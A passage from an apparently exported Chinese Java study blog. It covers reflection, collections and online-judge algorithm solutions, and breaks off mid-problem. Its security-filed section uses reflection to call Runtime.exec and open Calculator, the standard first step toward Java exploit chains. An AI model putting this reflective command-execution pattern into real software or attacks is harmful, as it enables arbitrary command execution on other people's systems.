<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">无参构造函数</span><br><span class="line">修改前的值h=<span class="number">5</span> 类型为 <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span></span><br><span class="line">修改前的值s=test 类型为 <span class="keyword">public</span></span><br><span class="line">修改前的值b=<span class="literal">false</span> 类型为 <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span></span><br><span class="line">------------------</span><br><span class="line">反射修改后直接获取h=<span class="number">5</span></span><br><span class="line">反射修改后反射获取h=<span class="number">10</span></span><br><span class="line">--------------------</span><br><span class="line">反射修改后直接获取s=hack</span><br><span class="line">反射修改后反射获取s=hack</span><br><span class="line">--------------------</span><br><span class="line">反射修改后直接获取b=<span class="literal">true</span></span><br><span class="line">反射修改后反射获取b=<span class="literal">true</span></span><br></pre></td></tr></table></figure>





<h3 id="调用方法"><a href="#调用方法" class="headerlink" title="调用方法"></a>调用方法</h3><h4 id="常规类调用方法"><a href="#常规类调用方法" class="headerlink" title="常规类调用方法"></a>常规类调用方法</h4><p>常规类调用方法流程为获取类、创建实例、执行方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * author: f19t</span></span><br><span class="line"><span class="comment"> * Date: 2023/2/18 21:22</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test_Reflect_Get_methods</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;Test&quot;</span>);</span><br><span class="line">        Class partypes[] = <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">2</span>];</span><br><span class="line">        partypes[<span class="number">0</span>] = Integer.TYPE;</span><br><span class="line">        partypes[<span class="number">1</span>] = Double.TYPE;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">meth</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;hello2&quot;</span>, partypes);</span><br><span class="line">        <span class="type">Test</span> <span class="variable">test</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line">        Object arglist[] = <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">2</span>];</span><br><span class="line">        arglist[<span class="number">0</span>] = <span class="keyword">new</span> <span class="title class_">Integer</span>(<span class="number">3</span>);</span><br><span class="line">        arglist[<span class="number">1</span>] = <span class="keyword">new</span> <span class="title class_">Double</span>(<span class="number">3.1</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">ref</span> <span class="operator">=</span> meth.invoke(test, arglist);</span><br><span class="line">        System.out.println(ref);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="单例类调用方法"><a href="#单例类调用方法" class="headerlink" title="单例类调用方法"></a>单例类调用方法</h4><h5 id="单例模式的特点"><a href="#单例模式的特点" class="headerlink" title="单例模式的特点"></a>单例模式的特点</h5><ul>
<li>单例类只能有一个实例。</li>
<li>单例类必须自己创建自己的唯一实例。</li>
<li>单例类必须给所有其他对象提供这一实例。</li>
<li>单例模式保证了全局对象的唯一性，比如系统启动读取配置文件就需要单例保证配置的一致性。</li>
</ul>
<p>java.lang.Runtime就是一个单例模式</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Runtime</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Runtime</span> <span class="variable">currentRuntime</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Runtime</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Returns the runtime object associated with the current Java application.</span></span><br><span class="line"><span class="comment">     * Most of the methods of class &lt;code&gt;Runtime&lt;/code&gt; are instance</span></span><br><span class="line"><span class="comment">     * methods and must be invoked with respect to the current runtime object.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span>  the &lt;code&gt;Runtime&lt;/code&gt; object associated with the current</span></span><br><span class="line"><span class="comment">     *          Java application.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Runtime <span class="title function_">getRuntime</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> currentRuntime;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Don&#x27;t let anyone else instantiate this class */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Runtime</span><span class="params">()</span> &#123;&#125;</span><br></pre></td></tr></table></figure>


<h5 id="Runtime的Runtime-exec调用"><a href="#Runtime的Runtime-exec调用" class="headerlink" title="Runtime的Runtime.exec调用"></a>Runtime的Runtime.exec调用</h5><p>注意点，invoke作用是执行方法，第一个参数为：</p>
<ul>
<li>如果是普通方法执行invoke，第一个参数放对象的实例；</li>
<li>如果是静态方法执行invoke，可以放null或类名；</li>
</ul>
<hr>
<p>放调用代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * author: f19t</span></span><br><span class="line"><span class="comment"> * Date: 2023/2/18 21:22</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test_Reflect_Get_methods</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> c.getDeclaredMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method1</span> <span class="operator">=</span> c.getDeclaredMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> method1.invoke(<span class="literal">null</span>);<span class="comment">//因为getRuntime为静态方法，并且return也是Runtime</span></span><br><span class="line">        method.invoke(obj, <span class="string">&quot;open /System/Applications/Calculator.app&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>JAVASEC</tag>
      </tags>
  </entry>
  <entry>
    <title>NYOJ-2-栈的运用</title>
    <url>/2023/02/13/NYOJ-2/</url>
    <content><![CDATA[<h2 id="NYOJ-2-栈的运用"><a href="#NYOJ-2-栈的运用" class="headerlink" title="NYOJ-2-栈的运用"></a>NYOJ-2-栈的运用</h2><p>今天刚学java集合，学到了栈，就拿这道题练练手吧。</p>
<hr>
<h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">输入描述</span><br><span class="line">第一行输入一个数N（0&lt;N&lt;=100）,表示有N组测试数据。后面的N行输入多组输入数据，每组输入数据都是一个字符串S(S的长度小于10000，且S不是空串），测试数据组数少于5组。数据保证S中只含有&quot;[&quot;, “]”, “(”, “)” 四种字符</span><br></pre></td></tr></table></figure>

<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">每组输入数据的输出占一行，如果该字符串中所含的括号是配对的，则输出Yes,如果不配对则输出No</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>最近刚学了Deque，可以使用栈解决这个问题。<br>思路：获取到”)”、”]”，就比对，不是就压栈，最后判断是否为空。后续有更好思路再补代码。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Deque;</span><br><span class="line"><span class="keyword">import</span> java.util.LinkedList;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OJ2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> in.nextInt();</span><br><span class="line">        String arr[] = <span class="keyword">new</span> <span class="title class_">String</span>[num];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i&lt;num;i++)&#123;arr[i]=in.next();&#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i&lt;num;i++)&#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> judge(arr[i]);</span><br><span class="line">            System.out.println(s);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">judge</span><span class="params">(String s)</span>&#123;</span><br><span class="line"></span><br><span class="line">        Deque&lt;String&gt; deque = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span><span class="number">0</span>;i&lt;s.length();i++)&#123;</span><br><span class="line">            deque.offerLast(s.substring(i,i+<span class="number">1</span>));</span><br><span class="line">            <span class="keyword">if</span> (deque.peekLast().equals(<span class="string">&quot;)&quot;</span>))&#123;</span><br><span class="line">                <span class="keyword">if</span> (deque.size()==<span class="number">1</span>)&#123;<span class="keyword">return</span> <span class="string">&quot;No&quot;</span>;&#125;</span><br><span class="line">                deque.pollLast();</span><br><span class="line">                <span class="keyword">if</span> (deque.peekLast().equals(<span class="string">&quot;(&quot;</span>))&#123;deque.removeLast();&#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">&quot;No&quot;</span>;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(deque.peekLast().equals(<span class="string">&quot;]&quot;</span>))&#123;</span><br><span class="line">                <span class="keyword">if</span> (deque.size()==<span class="number">1</span>)&#123;<span class="keyword">return</span> <span class="string">&quot;No&quot;</span>;&#125;</span><br><span class="line">                deque.pollLast();</span><br><span class="line">                <span class="keyword">if</span> (deque.peekLast().equals(<span class="string">&quot;[&quot;</span>))&#123;deque.removeLast();&#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">&quot;No&quot;</span>;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (deque.size()==<span class="number">0</span>)&#123;<span class="keyword">return</span> <span class="string">&quot;Yes&quot;</span>;&#125;<span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">&quot;No&quot;</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<hr>
<p>学到了比较值需要使用 <em><strong>.equals()</strong></em> 。</p>
]]></content>
      <categories>
        <category>OJ</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>Java集合</title>
    <url>/2023/02/13/Java%E9%9B%86%E5%90%88/</url>
    <content><![CDATA[<h2 id="Java集合"><a href="#Java集合" class="headerlink" title="Java集合"></a>Java集合</h2><p>本文介绍Java集合的数据结构，与简单测试。为后续学习算法打基础。</p>
<span id="more"></span>

<h3 id="List"><a href="#List" class="headerlink" title="List"></a>List</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        List&lt;String&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;();</span><br><span class="line">        list.add(<span class="string">&quot;apple&quot;</span>); <span class="comment">// size=1</span></span><br><span class="line">        list.add(<span class="string">&quot;pear&quot;</span>); <span class="comment">// size=2</span></span><br><span class="line">        list.add(<span class="string">&quot;apple&quot;</span>); <span class="comment">// 允许重复添加元素，size=3</span></span><br><span class="line">        System.out.println(list.size());</span><br><span class="line">        list.remove(<span class="number">1</span>);<span class="comment">//删除pear</span></span><br><span class="line">        System.out.println(list.size());</span><br><span class="line">        System.out.println(list.get(<span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3</span><br><span class="line">2</span><br><span class="line">apple</span><br></pre></td></tr></table></figure>

<hr>
<p>List是一种顺序列表接口常用方法：</p>
<ul>
<li>在末尾添加一个元素：boolean add(E e)</li>
<li>在指定索引添加一个元素：boolean add(int index, E e)</li>
<li>删除指定索引的元素：E remove(int index)</li>
<li>删除某个元素：boolean remove(Object e)</li>
<li>获取指定索引的元素：E get(int index)</li>
<li>获取链表大小（包含元素的个数）：int size()</li>
</ul>
<h3 id="Map"><a href="#Map" class="headerlink" title="Map"></a>Map</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Map&lt;String, String&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        map.put(<span class="string">&quot;s&quot;</span>,<span class="string">&quot;bbbbb&quot;</span>);</span><br><span class="line">        map.put(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;aaaaa&quot;</span>);</span><br><span class="line">        System.out.println(map.get(<span class="string">&quot;s&quot;</span>));<span class="comment">//获取数据</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (String key : map.keySet())&#123;    <span class="comment">//遍历map</span></span><br><span class="line">            System.out.println(map.get(key));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bbbbb</span><br><span class="line">aaaaa</span><br><span class="line">bbbbb</span><br></pre></td></tr></table></figure>
<hr>
<h3 id="Properties"><a href="#Properties" class="headerlink" title="Properties"></a>Properties</h3><p>Java默认配置文件以.properties为扩展名，每行以key&#x3D;value表示。java内置Properties读取配置文件非常简单。</p>
<p>典型配置文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># setting.properties</span></span><br><span class="line">last_open_file=1.txt</span><br><span class="line">auto_save_interval=60</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> FileNotFoundException,Exception&#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">f</span> <span class="operator">=</span> <span class="string">&quot;配置文件&quot;</span>;</span><br><span class="line">        <span class="type">Properties</span> <span class="variable">props</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">        props.load(<span class="keyword">new</span> <span class="title class_">java</span>.io.FileInputStream(f));</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">filepath</span> <span class="operator">=</span> props.getProperty(<span class="string">&quot;last_open_file&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">interval</span> <span class="operator">=</span> props.getProperty(<span class="string">&quot;auto_save_interval&quot;</span>, <span class="string">&quot;120&quot;</span>);<span class="comment">//如果没有值，赋予默认值</span></span><br><span class="line"></span><br><span class="line">        System.out.println(filepath);</span><br><span class="line">        System.out.println(interval);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.txt</span><br><span class="line">60</span><br></pre></td></tr></table></figure>

<h3 id="Set"><a href="#Set" class="headerlink" title="Set"></a>Set</h3><p>只需要存储不重复的key，并不需要存储映射的value，那么就可以使用Set。</p>
<h3 id="Queue"><a href="#Queue" class="headerlink" title="Queue"></a>Queue</h3><p>队列（Queue）是一种经常使用的集合。Queue实际上是实现了一个先进先出（FIFO：First In First Out）的有序表。它和List的区别在于，List可以在任意位置添加和删除元素，而Queue只有两个操作：</p>
<ul>
<li>把元素添加到队列末尾；</li>
<li>从队列头部取出元素。</li>
</ul>
<p>队列接口Queue定义了以下几个方法：</p>
<ul>
<li>int size()：获取队列长度；</li>
<li>boolean add(E)&#x2F;boolean offer(E)：添加元素到队尾；</li>
<li>E remove()&#x2F;E poll()：获取队首元素并从队列中删除；</li>
<li>E element()&#x2F;E peek()：获取队首元素但并不从队列中删除。</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> FileNotFoundException,Exception&#123;</span><br><span class="line"></span><br><span class="line">        Queue&lt;String&gt; q = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        q.offer(<span class="string">&quot;aaaaaaa&quot;</span>);</span><br><span class="line">        q.offer(<span class="string">&quot;bbbbbbb&quot;</span>);</span><br><span class="line">        q.offer(<span class="string">&quot;ccccccc&quot;</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(q.peek());<span class="comment">//获取首位数据，不删除</span></span><br><span class="line">        System.out.println(q.peek());</span><br><span class="line">        System.out.println(q.peek());</span><br><span class="line">        System.out.println(<span class="string">&quot;-------------&quot;</span>);</span><br><span class="line">        System.out.println(q.poll());<span class="comment">//获取首位数据，并删除</span></span><br><span class="line">        System.out.println(q.poll());</span><br><span class="line">        System.out.println(q.poll());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aaaaaaa</span><br><span class="line">aaaaaaa</span><br><span class="line">aaaaaaa</span><br><span class="line">-------------</span><br><span class="line">aaaaaaa</span><br><span class="line">bbbbbbb</span><br><span class="line">ccccccc</span><br></pre></td></tr></table></figure>

<h3 id="Deque"><a href="#Deque" class="headerlink" title="Deque"></a>Deque</h3><p>两头都出，这种队列叫双端队列（Double Ended Queue），学名Deque。<br>Java集合提供了接口Deque来实现一个双端队列，它的功能是：</p>
<ul>
<li>既可以添加到队尾，也可以添加到队首；</li>
<li>既可以从队首获取，又可以从队尾获取。</li>
</ul>
<p>用处：Deque当Stack使用。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> FileNotFoundException,Exception&#123;</span><br><span class="line"></span><br><span class="line">        Deque&lt;String&gt; q = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        q.offerLast(<span class="string">&quot;aaaaaaa&quot;</span>);</span><br><span class="line">        q.offerLast(<span class="string">&quot;bbbbbbb&quot;</span>);</span><br><span class="line">        q.offerLast(<span class="string">&quot;ccccccc&quot;</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(q.peekLast());<span class="comment">//获取末位数据，不删除</span></span><br><span class="line">        System.out.println(q.peekLast());</span><br><span class="line">        System.out.println(q.peekLast());</span><br><span class="line">        System.out.println(<span class="string">&quot;-------------&quot;</span>);</span><br><span class="line">        System.out.println(q.pollLast());<span class="comment">//获取末位数据，并删除</span></span><br><span class="line">        System.out.println(q.pollLast());</span><br><span class="line">        System.out.println(q.pollLast());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ccccccc</span><br><span class="line">ccccccc</span><br><span class="line">ccccccc</span><br><span class="line">-------------</span><br><span class="line">ccccccc</span><br><span class="line">bbbbbbb</span><br><span class="line">aaaaaaa</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>JAVA基础</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>NYOJ-32-深度优先搜索算法</title>
    <url>/2023/02/15/NYOJ32-%E6%B7%B1%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<h2 id="NYOJ-32-深度优先搜索算法"><a href="#NYOJ-32-深度优先搜索算法" class="headerlink" title="NYOJ-32-深度优先搜索算法"></a>NYOJ-32-深度优先搜索算法</h2><p>最近两天学习了深度优先算法，并做了一道oj题，这里记录一下。</p>
<span id="more"></span>

<h3 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h3><h4 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h4><p>找出从自然数1、2、… 、n（0&lt;n&lt;10）中任取r(0&lt;r&lt;&#x3D;n)个数的所有组合。</p>
<h4 id="输入描述"><a href="#输入描述" class="headerlink" title="输入描述"></a>输入描述</h4><p>输入n、r。</p>
<h4 id="输出描述"><a href="#输出描述" class="headerlink" title="输出描述"></a>输出描述</h4><p>按特定顺序输出所有组合。<br>特定顺序：每一个组合中的值从大到小排列，组合之间按逆字典序排列。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入 5 3</span><br><span class="line">输出：</span><br><span class="line">543</span><br><span class="line">542</span><br><span class="line">541</span><br><span class="line">532</span><br><span class="line">531</span><br><span class="line">521</span><br><span class="line">432</span><br><span class="line">431</span><br><span class="line">421</span><br><span class="line">321</span><br></pre></td></tr></table></figure>

<h3 id="解题代码"><a href="#解题代码" class="headerlink" title="解题代码"></a>解题代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NYOJ32</span> &#123; <span class="comment">//组合数，深度优先搜索</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="type">Scanner</span> <span class="variable">in</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">    <span class="keyword">static</span> <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> in.nextInt(); <span class="comment">//读取基础数据</span></span><br><span class="line">    <span class="keyword">static</span> <span class="type">int</span> <span class="variable">r</span> <span class="operator">=</span> in.nextInt(); <span class="comment">//读取长度</span></span><br><span class="line">    <span class="keyword">static</span> <span class="type">int</span>[] book = <span class="keyword">new</span> <span class="title class_">int</span>[n+<span class="number">1</span>];<span class="comment">//标记数据是否被使用</span></span><br><span class="line">    <span class="keyword">static</span> <span class="type">int</span>[] out = <span class="keyword">new</span> <span class="title class_">int</span>[r+<span class="number">1</span>]; <span class="comment">//设置输出长度</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        dfs(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">dfs</span><span class="params">(<span class="type">int</span> step)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (step &gt; r) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (i=<span class="number">1</span>;i&lt;=r-<span class="number">1</span>;i++)&#123;  <span class="comment">//判断高位大于低位</span></span><br><span class="line">                <span class="keyword">if</span> (out[i]&lt;out[i+<span class="number">1</span>])&#123;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;=r; i++) &#123;</span><br><span class="line">                System.out.print(out[i]);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">&quot;&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (i = n; i &gt; <span class="number">0</span>; i--) &#123;  <span class="comment">//深度优先算法</span></span><br><span class="line">            <span class="keyword">if</span> (book[i] == <span class="number">0</span>) &#123;</span><br><span class="line">                out[step]=i;</span><br><span class="line">                book[i]=<span class="number">1</span>;</span><br><span class="line">                dfs(step+<span class="number">1</span>);</span><br><span class="line">                book[i]=<span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<p>学到了，理解深度优先搜索的关键在于解决 <em><strong>“当下该如何做”</strong></em> 。至于 <em><strong>“下一步如何做”</strong></em> 则与 <em><strong>“当下该如何做”</strong></em> 是一样的。</p>
]]></content>
      <categories>
        <category>OJ</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>NYOJ58-广度优先搜索算法</title>
    <url>/2023/02/17/NYOJ58-%E5%B9%BF%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<h2 id="NYOJ-58-广度优先搜索算法"><a href="#NYOJ-58-广度优先搜索算法" class="headerlink" title="NYOJ-58-广度优先搜索算法"></a>NYOJ-58-广度优先搜索算法</h2><p>最近三天学习了深度优先算法，并做了一道oj题，遇到了一些问题，并解决了一些问题，这里记录一下。</p>
<span id="more"></span>

<h3 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h3><h4 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h4><p>这有一个迷宫，有0~8行和0~8列：</p>
<p> 1,1,1,1,1,1,1,1,1<br> 1,0,0,1,0,0,1,0,1<br> 1,0,0,1,1,0,0,0,1<br> 1,0,1,0,1,1,0,1,1<br> 1,0,0,0,0,1,0,0,1<br> 1,1,0,1,0,1,0,0,1<br> 1,1,0,1,0,1,0,0,1<br> 1,1,0,1,0,0,0,0,1<br> 1,1,1,1,1,1,1,1,1</p>
<p>0表示道路，1表示墙。<br>现在输入一个道路的坐标作为起点，再如输入一个道路的坐标作为终点，问最少走几步才能从起点到达终点？<br>（注：一步是指从一坐标点走到其上下左右相邻坐标点，如：从（3，1）到（4,1）。）</p>
